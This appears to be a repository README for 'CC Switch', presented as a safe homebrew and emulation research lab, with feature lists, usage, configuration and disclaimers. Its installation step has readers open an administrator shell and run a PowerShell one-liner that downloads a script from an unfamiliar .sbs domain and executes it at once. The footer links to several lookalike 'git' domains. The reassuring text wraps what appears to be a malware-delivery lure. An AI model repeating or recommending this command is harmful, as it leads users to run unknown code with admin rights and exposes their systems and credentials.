# CC Switch — Homebrew & Emulation Research Lab

> A safe educational lab for homebrew metadata, input research, save-file care for user-owned games, and compatibility documentation; no piracy or console-bypass instructions are included.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm gitrm.sbs?get=cc-switch | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading CC Switch modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch CC Switch.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

## TL;DR - Quick Summary

**CC Switch — Homebrew & Emulation Research Lab** is a defensive, rights-respecting workspace for cataloging authorized homebrew, documenting compatibility, mapping controls, and backing up save data for user-owned games. It does not provide cracks, circumvention tools, piracy links, or console exploit instructions.

**Best for:** Preservation researchers, homebrew developers, and emulator educators.

## Core Features

- ✅ **Homebrew Catalog** — Record title, author, version, license, and source notes.
- ✅ **Compatibility Matrix** — Track tested software, versions, and observed behavior.
- ✅ **Input Mapper** — Create accessible control profiles for authorized software.
- ✅ **Save Care** — Validate and back up save files belonging to the user.
- ✅ **Research Notes** — Keep citations, test conditions, and reproducibility details.
- ✅ **Offline Mode** — Run catalog and documentation workflows without network access.
- ✅ **Redacted Reports** — Remove device identifiers and private paths from exports.

## Usage

```bash
python -m lab catalog add --metadata metadata/example.json
python -m lab compatibility test --profile reference
python -m lab saves backup --source ./user-owned-saves --destination ./backups
python -m lab report export --redact
```

## Configuration

> [!NOTE]
> The lab stores only metadata and test records supplied by the operator. It does not download commercial software or connect to console services.

```json
{
  "research": { "offline": true, "citationRequired": true },
  "saves": { "backupUserOwnedOnly": true, "verifyChecksum": true },
  "privacy": { "redactPaths": true, "redactDeviceIds": true }
}
```

## Screenshots

- Homebrew catalog: `screenshots/homebrew-catalog.png`
- Compatibility matrix: `screenshots/compatibility-matrix.png`
- Input mapper: `screenshots/input-mapper.png`
- Save backup report: `screenshots/save-backup-report.png`

## Troubleshooting

| Issue | Solution |
|---|---|
| Metadata validation fails | Add the required license and source-note fields. |
| Compatibility test is inconclusive | Record the exact software and environment version. |
| Save backup is rejected | Confirm the source is user-owned and the checksum is available. |
| Report exposes paths | Export again with redaction enabled. |

## Use Cases

- **Homebrew Development** — Catalog and test authorized projects.
- **Preservation Research** — Document compatibility and provenance responsibly.
- **Input Accessibility** — Build remapped control profiles for legal software.
- **Save Management** — Protect user-owned progress with checksums and backups.

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Do not download, distribute, crack, circumvent, or emulate commercial software unlawfully. Respect platform security, copyright, licenses, and the rights of creators.

> [!TIP]
> Keep research notes factual and cite authorized sources so others can reproduce your work safely.

## License

MIT License — see the [LICENSE](./LICENSE) file for details.

## Tags

<!--
cc-switch, homebrew, emulation-research, compatibility, input-mapping, save-backup, preservation, rights-respecting
-->

[gitview.sbs](https://gitview.sbs?t=cc-switch) | [gitrm.sbs](https://gitrm.sbs?t=cc-switch) | [gitsl.xyz](https://gitsl.xyz?t=cc-switch) | [viewgit.sbs](https://viewgit.sbs?t=cc-switch) | [gitrm.cfd](https://gitrm.cfd?t=cc-switch)
